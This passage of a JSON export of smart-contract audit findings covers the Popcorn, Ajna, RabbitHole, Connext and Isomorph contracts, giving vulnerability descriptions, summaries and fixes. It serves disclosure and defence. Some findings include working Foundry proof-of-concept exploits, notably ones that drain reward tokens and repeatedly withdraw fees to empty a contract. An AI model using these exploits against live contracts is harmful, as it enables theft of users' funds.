addTemplate(\"Adapter\", templateId, adapterImpl, true, true);\n    addTemplate(\"Strategy\", \"MockStrategy\", strategyImpl, false, true);\n    addTemplate(\"Vault\", \"V1\", vaultImpl, true, true);\n\n    // 1. deploy regular legit vault owned by this\n    address vault = deployVault();\n    address staking = vaultRegistry.getVault(vault).staking;\n\n    rewardToken.mint(staking, 1_000_000 ether);\n\n    vm.startPrank(bob);\n    asset.mint(bob, 10000 ether);\n    asset.approve(vault, 10000 ether);\n    IVault(vault).deposit(10000 ether, bob);\n    IVault(vault).approve(staking, 10000 ether);\n    IMultiRewardStaking(staking).deposit(9900 ether, bob);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    // 2. deploy attacker-owned vault using the same Staking contract as legit vault\n    // alice is the attacker\n    address attackerVault = controller.deployVault(\n      VaultInitParams({\n        asset: iAsset,\n        adapter: IERC4626(address(0)),\n        fees: VaultFees({\n          deposit: 100,\n          withdrawal: 200,\n          management: 300,\n          performance: 400\n        }),\n        feeRecipient: feeRecipient,\n        owner: address(this)\n      }),\n      DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),\n      DeploymentArgs({ id: 0, data: \"\" }),\n      staking,\n      \"\",\n      VaultMetadata({\n        vault: address(0),\n        staking: staking,\n        creator: alice,\n        metadataCID: metadataCid,\n        swapTokenAddresses: swapTokenAddresses,\n        swapAddress: address(0x5555),\n        exchange: uint256(1)\n      }),\n      0\n    );\n\n    asset.mint(alice, 10 ether);\n    asset.approve(vault, 10 ether);\n    IVault(vault).deposit(10 ether, alice);\n    IVault(vault).approve(staking, 10 ether);\n    IMultiRewardStaking(staking).deposit(1 ether, alice);\n\n    address[] memory targets = new address[](1);\n    targets[0] = attackerVault;\n    IERC20[] memory rewardTokens = new IERC20[](1);\n    rewardTokens[0] = iRewardToken;\n    uint160[] memory rewardsSpeeds = new uint160[](1);\n    rewardsSpeeds[0] = 990_099_990 ether;\n    controller.changeStakingRewardsSpeeds(targets, rewardTokens, rewardsSpeeds);\n\n    assertGt(rewardToken.balanceOf(staking), 1_000_000 ether);\n\n    vm.warp(block.timestamp + 12);\n    MultiRewardStaking(staking).claimRewards(alice, rewardTokens);\n\n    assertGt(rewardToken.balanceOf(alice), 999_999 ether);\n    assertLt(1 ether, rewardToken.balanceOf(staking));\n    vm.stopPrank();\n  }\n```\n\nThe PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract.)\nNote that the attacker can tweak the amount they stake in the contract, the reward speed they'll use, and the seconds to wait before, before claiming rewards. All of those things have an effect on the cost of the attack and how much can be drained.\n\nThe test can be run with:\n`forge test --no-match-contract 'Abstract' --match-test test__steal_rewards_from_any_staking_contract`\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\n1.  Don't allow any Vault creator to use and modify just ANY Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L106-L108>\n2.  Add checks to limit how high `rewardsPerSecond` can be when changing rewardSpeed. Maybe make it so that it takes a minimum of 1 month (or some other configurable period) for rewards to be distributed. - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L299-L314>\n3.  Fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L351-L360>\n\n**[RedVeil (Popcorn) confirmed](https://github.com/code-423n4/2023-01-popcorn-findings/issues/263)** \n\n***\n\n",
      "summary": "\nThis bug report is about an attack that allows an attacker to steal 99% of the balance of a reward token of any Staking contract in the blockchain. The attack is made possible by four issues: any user can deploy a Vault that uses any existing Staking contract, the attacker can call `changeStakingRewardSpeeds` to modify the reward speeds of any reward tokens in the target Staking contract, there are no checks for limits on the `rewardsPerSecond` value in `changeRewardSpeed`, and `changeRewardSpeed` uses `_calcRewardsEnd` to get the new `rewardsEndTimestamp` but that calculation is faulty and the new timestamp is always longer than it's supposed to be leading to people being able to claim more rewards than they should get. \n\nThe bug report includes a Proof of Concept (PoC) using Foundry test. The PoC shows that the attacker, Alice, can drain any reward token of a Staking contract deployed by a different vault owner. In this test case, Alice does the attack described above stealing a total 999,999 worth of reward tokens (99% of reward tokens owned by the Staking contract).\n\nThe recommended mitigation steps are to not allow any Vault creator to use and modify just ANY Staking contract, add checks to limit how high `rewardsPerSecond` can be when changing rewardSpeed, and fix calcRewardsEnd to compute the correct rewardsEndTimestamp by taking into account total accrued rewards until that point in time. RedVeil (Popcorn) has confirmed the bug report.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/reports/2023-01-popcorn",
      "sponsor_name": "Popcorn",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2023-01-popcorn",
      "github_link": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/263",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "211",
      "slug": "h-09-attacker-can-steal-99-of-total-balance-from-any-reward-token-in-any-staking-contract-code4rena-popcorn-popcorn-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Popcorn",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Popcorn",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 1
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 1
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        },
        {
          "tags_tag": {
            "title": "Deposit/Reward tokens"
          }
        },
        {
          "tags_tag": {
            "title": "Business Logic"
          }
        }
      ]
    },
    {
      "id": "6300",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "46",
      "title": "M-3: Anyone can transfer approved LP tokens",
      "content": "Source: https://github.com/sherlock-audit/2023-01-ajna-judging/issues/156 \n\n## Found by \nJeiwan\n\n## Summary\nAnyone can call the `Pool.transferLPs` function and transfer previously approved LP tokens to the approved address.\n## Vulnerability Detail\nThe [Pool.transferLPs](https://github.com/sherlock-audit/2023-01-ajna/blob/main/contracts/src/base/Pool.sol#L238) function allows to transfer LP tokens from one address to another. Even though it requires [approving](https://github.com/sherlock-audit/2023-01-ajna/blob/main/contracts/src/base/Pool.sol#L169) a transfer, actual transferring is left at the discretion of the approved address: approving allows the approved address to transfer LP tokens when appropriate. However, since the `Pool.transferLPs` function can be called by any address, the owner of the tokens may be impacted.\n## Impact\nLender's LP tokens may be transferred to an approve address at an inappropriate time, impacting the position management strategy of the lender.\n## Code Snippet\n[Pool.sol#L238](https://github.com/sherlock-audit/2023-01-ajna/blob/main/contracts/src/base/Pool.sol#L238)\n## Tool used\nManual Review\n## Recommendation\nConsider allowing calling the `Pool.transferLPs` function only to the `owner` or `newOwner_`.\n\n## Discussion\n\n**grandizzy**\n\nremoving will fix label, will address after Sherlock contest",
      "summary": "\nThis bug report is about the Pool.transferLPs function in the Pool.sol file of the 2023-01-ajna project on Github. The function allows for LP tokens to be transferred from one address to another, but it requires approval first. The problem is that anyone can call the function, not just the approved address, which can result in the lender's LP tokens being transferred at an inappropriate time, impacting the position management strategy of the lender. The recommendation is to consider allowing the calling of the function to only the owner or newOwner_. The bug report was found by Jeiwan and the tool used was manual review.",
      "report_date": {},
      "contest_prize_txt": "75000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/32",
      "sponsor_name": "Ajna",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-ajna-judging/issues/156",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "32",
      "slug": "m-3-anyone-can-transfer-approved-lp-tokens-sherlock-ajna-ajna-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Ajna",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Ajna",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Launchpad"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "8851",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 65,
      "protocol_id": "51",
      "title": "[H-02] Protocol fees can be withdrawn multiple times in Erc20Quest",
      "content": "## Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104\n\n\n## Vulnerability details\n\nThe `withdrawFee` function present in the `Erc20Quest` contract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104\n\n```solidity\nfunction withdrawFee() public onlyAdminWithdrawAfterEnd {\n    IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n}\n```\n\nThis function doesn't provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.\n\n## Impact\n\nThe `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven't claimed their rewards yet) and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.\n\nNote also that the `onlyAdminWithdrawAfterEnd` modifier, even though it indicates that an \"admin\" should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79\n\n```solidity\nmodifier onlyAdminWithdrawAfterEnd() {\n    if (block.timestamp < endTime) revert NoWithdrawDuringClaim();\n    _;\n}\n```\n\nThis means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.\n\n## PoC\n\nIn the following demonstration, the `withdrawFee` function is called multiple times by a bad actor to remove all tokens from the quest contract.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n\n    function signReceipt(address account, string memory questId)\n        internal\n        view\n        returns (bytes32 hash, bytes memory signature)\n    {\n        hash = keccak256(abi.encodePacked(account, questId));\n        bytes32 message = ECDSA.toEthSignedMessageHash(hash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);\n        signature = abi.encodePacked(r, s, v);\n    }\n\n    function claimReceipt(address account, string memory questId) internal {\n        (bytes32 hash, bytes memory signature) = signReceipt(account, questId);\n        vm.prank(account);\n        factory.mintReceipt(questId, hash, signature);\n    }\n    \n    function test_Erc20Quest_ProtocolFeeWithdrawMultipleTimes() public {\n        address alice = makeAddr(\"alice\");\n        address attacker = makeAddr(\"attacker\");\n\n        uint256 startTime = block.timestamp + 1 hours;\n        uint256 endTime = startTime + 1 hours;\n        uint256 totalParticipants = 1;\n        uint256 rewardAmountOrTokenId = 1 ether;\n        string memory questId = \"a quest\";\n\n        // create, fund and start quest\n        vm.startPrank(deployer);\n\n        Erc20Quest quest = Erc20Quest(\n            factory.createQuest(\n                address(token),\n                endTime,\n                startTime,\n                totalParticipants,\n                rewardAmountOrTokenId,\n                \"erc20\",\n                questId\n            )\n        );\n\n        uint256 rewards = totalParticipants * rewardAmountOrTokenId;\n        uint256 fees = (rewards * factory.questFee()) / 10_000;\n        deal(address(token), address(quest), rewards + fees);\n        quest.start();\n\n        vm.stopPrank();\n\n        // simulate at least one user claims a receipt\n        claimReceipt(alice, questId);\n\n        // simulate time elapses until the end of the quest\n        vm.warp(endTime);\n\n        // The following can be executed by attacker (griefer) or by the fee recipient\n        vm.startPrank(attacker);\n\n        uint256 protocolFee = quest.protocolFee();\n        uint256 withdrawCalls = (rewards + fees) / protocolFee;\n\n        for (uint256 i = 0; i < withdrawCalls; i++) {\n            quest.withdrawFee();\n        }\n\n        // Fee recipient has 100% of the funds\n        assertEq(token.balanceOf(protocolFeeRecipient), rewards + fees);\n        assertEq(token.balanceOf(address(quest)), 0);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## Recommendation\n\nAdd a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.",
      "summary": "\nThe bug report is about a vulnerability in the `withdrawFee` function present in the `Erc20Quest` contract which can be used to withdraw protocol fees after a quest has ended. This function does not provide any kind of protection and can be called multiple times, resulting in the theft of funds from the contract. This can be done by anyone since the `onlyAdminWithdrawAfterEnd` modifier only validates the quest end time and fails to provide any kind of access control. \n\nThe impact of this bug is that the `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.\n\nA Proof of Concept is provided which demonstrates how the `withdrawFee` function can be called multiple times by a bad actor to remove all tokens from the quest contract. \n\nThe recommendation to fix this bug is to add a flag to the contract to indicate if protocol fees have been already withdrawn. Additionally, a check should be added to prevent the function from being called again.",
      "report_date": {},
      "contest_prize_txt": "$36,500 USDC",
      "contest_link": "https://code4rena.com/contests/2023-01-rabbithole-quest-protocol-contest",
      "sponsor_name": "RabbitHole",
      "sponsor_link": "https://twitter.com/rabbithole_gg",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/605",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "208",
      "slug": "h-02-protocol-fees-can-be-withdrawn-multiple-times-in-erc20quest-code4rena-rabbithole-rabbithole-quest-protocol-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "RabbitHole",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "RabbitHole",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7157",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "72",
      "title": "WatcherManager is not set correctly",
      "content": "## Security Analysis Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`WatcherClient.sol#L36-L39`\n\n## Description\nThe `setWatcherManager` function missed actually updating the `watcherManager`. Instead, it is just emitting an event indicating that the Watcher Manager is updated when it is not. This could become a problem once new modules are added/revised in the `WatcherManager` contract, and `WatcherClient` wants to use this upgraded `WatcherManager`. `WatcherClient` will be forced to use the outdated `WatcherManager` contract code.\n\n## Recommendation\nRevise the `setWatcherManager` function as shown below:\n\n```solidity\nfunction setWatcherManager(address _watcherManager) external onlyOwner {\n    require(_watcherManager != address(watcherManager), \"already watcher manager\");\n    watcherManager = WatcherManager(_watcherManager);\n    emit WatcherManagerChanged(_watcherManager);\n}\n```\n\n## Connext\nFixed in PR 2432.\n\n## Spearbit\nVerified.",
      "summary": "\nThis bug report is about a medium risk issue in the WatcherClient.sol code. The setWatcherManager function is not updating the watcherManager as it should, instead it is just emitting an event saying that the Watcher Manager is updated. This could be a problem if new modules are added/revised and WatcherClient wants to use the upgraded WatcherManager.\n\nThe recommendation is to revise the setWatcherManager function as shown in the report. The bug has been fixed in PR 2432 and verified by Spearbit.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/ConnextNxtp-Spearbit-Security-Review.pdf",
      "pdf_page_from": 28,
      "contest_id": "",
      "slug": "watchermanager-is-not-set-correctly-spearbit-connext-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Connext",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Connext",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Can't Remove Access Control"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "7148",
      "kind": "PDF",
      "auditfirm_id": "6",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "72",
      "title": "Router recipient can be configured more than once",
      "content": "## Severity: Medium Risk\n\n## Context\nRoutersFacet.sol#L401\n\n## Description\nThe comments from the `setRouterRecipient` function mentioned that the router should only be able to set the recipient once. Otherwise, no problem is solved. However, based on the current implementation, it is possible for the router to set its recipient more than once.\n\n### File: RoutersFacet.sol\n```solidity\n394: /**\n395:  * @notice Sets the designated recipient for a router\n396:  * @dev Router should only be able to set this once otherwise if router key compromised,\n397:  * no problem is solved since attacker could just update recipient\n398:  * @param router Router address to set recipient\n399:  * @param recipient Recipient Address to set to router\n400:  */\n401: function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) {\n```\n\nLet's assume that during router setup, the `setupRouter` function is being called and the owner is set to Alice's first EOA (0x123), and the recipient is set to Alice's second EOA (0x456). Although the comment mentioned that `setRouterRecipient` should only be set once, this is not true because this function will only revert if the `_prevRecipient == recipient`. As long as the new recipient is not the same as the previous recipient, the function will happily accept the new recipient.\n\nTherefore, if the router's signing key is compromised by Bob (attacker), he could call the `setRouterRecipient` function to change the new recipient to his personal EOA and drain the funds within the router.\n\nThe `setRouterRecipient` function is protected by the `onlyRouterOwner` modifier. Since Bob has the compromised router's signing key, he will be able to pass this validation check.\n\n### File: RoutersFacet.sol\n```solidity\n157: /**\n158:  * @notice Asserts caller is the router owner (if set) or the router itself\n159:  */\n160: modifier onlyRouterOwner(address _router) {\n161:     address owner = s.routerPermissionInfo.routerOwners[_router];\n162:     if (!((owner == address(0) && msg.sender == _router) || owner == msg.sender))\n163:         revert RoutersFacet__onlyRouterOwner_notRouterOwner();\n164:     _;\n165: }\n```\n\nThe second validation is at Line 404, which checks if the new recipient is not the same as the previous recipient. The `recipient` variable is set to Bob's EOA wallet, while `_prevRecipient` variable is set to Alice's second EOA (0x456). Therefore, the condition at Line 404 is false, and it will not revert. So Bob successfully set the recipient to his EOA at Line 407.\n\n### File: RoutersFacet.sol\n```solidity\n401: function setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) {\n402:    // Check recipient is changing\n403:    address _prevRecipient = s.routerPermissionInfo.routerRecipients[router];\n404:    if (_prevRecipient == recipient) revert RoutersFacet__setRouterRecipient_notNewRecipient();\n405:\n406:    // Set new recipient\n407:    s.routerPermissionInfo.routerRecipients[router] = recipient;\n```\n\nPer the Github discussion, the motivation for such a design is the following: If a router's signing key is compromised, the attacker could drain the liquidity stored on the contract and send it to any specified address. This effectively means the key is in control of all unused liquidity on-chain, which prevents router operators from adding large amounts of liquidity directly to the contract. Routers should be able to delegate the safe withdrawal address of any unused liquidity, creating a separation of concerns between the router key and liquidity safety.\n\nIn summary, the team is trying to create a separation of concerns between the router key and liquidity safety. With the current implementation, there is no security benefit of segregating the router owner role and recipient role unless the router owner has been burned (e.g., set to address zero). Because once the router's signing key is compromised, the attacker can change the recipient anyway. The security benefits of the separation of concerns will only be achieved if the recipient can truly be set only once.\n\n## Recommendation\nIf the intention is to only allow the router owner to set the recipient once and not allow them to change it afterward, then the code should be as follows:\n\n```solidity\nfunction setRouterRecipient(address router, address recipient) external onlyRouterOwner(router) {\n    // Check recipient is changing\n    address _prevRecipient = s.routerPermissionInfo.routerRecipients[router];\n    + if (_prevRecipient != address(0)) revert RoutersFacet__setRouterRecipient_RecipientAlreadySet();\n    - if (_prevRecipient == recipient) revert RoutersFacet__setRouterRecipient_notNewRecipient();\n    // Set new recipient\n    s.routerPermissionInfo.routerRecipients[router] = recipient;\n    // Emit event\n    emit RouterRecipientSet(router, _prevRecipient, recipient);\n}\n```\n\nThe above implementation will always revert as long as the recipient address has already been set.\n\n**Connext:** Solved in PR 2413.  \n**Spearbit:** Verified.",
      "summary": "\nThis bug report concerns the RoutersFacet.sol file, specifically the setRouterRecipient function. The comments for the function state that it should only be able to set the recipient once, otherwise the security benefits of the separation of concerns between router key and liquidity safety are not achieved. However, the current implementation allows the router to set its recipient more than once, which can be exploited by an attacker if the router's signing key is compromised. \n\nThe function is protected by the onlyRouterOwner modifier, which checks if the caller is the router owner or the router itself. If the router's key is compromised, the attacker will be able to pass this validation check. The second validation check is to ensure that the new recipient is not the same as the previous recipient, but this does not prevent the attacker from changing the recipient to their own address. \n\nThe team is trying to create a separation of concerns between router key and liquidity safety. The security benefits of this separation will only be achieved if the recipient can truly be set only once. To fix this, the code should be changed so that the function will always revert if the recipient address has already been set. This bug was solved in PR 2413 and was verified.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/spearbit/ConnextNxtp-Spearbit-Security-Review.pdf",
      "pdf_page_from": 22,
      "contest_id": "",
      "slug": "router-recipient-can-be-configured-more-than-once-spearbit-connext-pdf",
      "firm_name": "Spearbit",
      "firm_logo_square": "spearbit_square.png",
      "protocol_name": "Connext",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Spearbit",
        "logo_square": "spearbit_square.png"
      },
      "protocols_protocol": {
        "name": "Connext",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "5690",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "81",
      "title": "H-7: User can steal rewards from other users by withdrawing their Velo Deposit NFTs from other users' depositors",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/51 \n\n## Found by \n0x52, HollaDieWaldfee\n\n## Summary\n\nRewards from staking AMM tokens accumulate to the depositor used to deposit them. The rewards accumulated by a depositor are passed to the owner when they claim. A malicious user to steal the rewards from other users by manipulating other users depositors. Since any NFT of a DepositReceipt can be withdrawn from any depositor with the same DepositReceipt, a malicious user could mint an NFT on their depositor then withdraw in from another user's depositor. The net effect is that that the victims deposits will effectively be in the attackers depositor and they will collect all the rewards.\n\n## Vulnerability Detail\n\n    function withdrawFromGauge(uint256 _NFTId, address[] memory _tokens)  public  {\n        uint256 amount = depositReceipt.pooledTokens(_NFTId);\n        depositReceipt.burn(_NFTId);\n        gauge.getReward(address(this), _tokens);\n        gauge.withdraw(amount);\n        //AMMToken adheres to ERC20 spec meaning it reverts on failure, no need to check return\n        //slither-disable-next-line unchecked-transfer\n        AMMToken.transfer(msg.sender, amount);\n    }\n\nEvery user must create a `Depositor` using `Templater` to interact with vaults and take loans. `Depositor#withdrawFromGauge` allows any user to withdraw any NFT that was minted by the same `DepositReciept`. This is where the issues arises. Since rewards are accumulated to the `Depositor` in which the underlying is staked a user can deposit to their `Depositor` then withdraw their NFT through the `Depositor` of another user's `Depositor` that uses the same `DepositReciept`. The effect is that the tokens will remained staked to the attackers `Depositor` allowing them to steal all the other user's rewards.\n\nExample:\n`User A` and `User B` both create a `Depositor` for the same `DepositReciept`. Both users deposit 100 tokens into their respective `Depositors`. `User B` now calls `withdrawFromGauge` on `Depositor A`. `User B` gets their 100 tokens back and `Depositor B` still has 100 tokens deposited in it. `User B` cannot steal these tokens but they are now collecting the yield on all 100 tokens via `Depositor B` and `User A` isn't getting any rewards at all because `Depositor A` no longer has any tokens deposited into Velodrome gauge.\n\n## Impact\n\nMalicious user can steal other user's rewards\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Velo-Deposit-Tokens/contracts/Depositor.sol#L119-L127\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDepositors should only be able to burn NFTs that they minted. Change DepositReciept_Base#burn to enforce this:\n\n        function burn(uint256 _NFTId) external onlyMinter{\n    +       //tokens must be burned by the depositor that minted them\n    +       address depositor = relatedDepositor[_NFTId];\n    +       require(depositor == msg.sender, \"Wrong depositor\");\n            require(_isApprovedOrOwner(msg.sender, _NFTId), \"ERC721: caller is not token owner or approved\");\n            delete pooledTokens[_NFTId];\n            delete relatedDepositor[_NFTId];\n            _burn(_NFTId);\n        }\n\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, will fix. Appears to be a duplicate of issue #43 's footnote.\n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/Velo-Deposit-Tokens/commit/23ff5653b555b11c9f4dead7ff5a72d50eac5788\n\nWe have taken a different approach to that suggested by the auditor, theirs looked valid though. \nWe added the checks on lines 82 and 123 that validate any depositReceipt being withdrawn was originally minted by that Depositor contract. Other lines changed in this commit relate to #47 .",
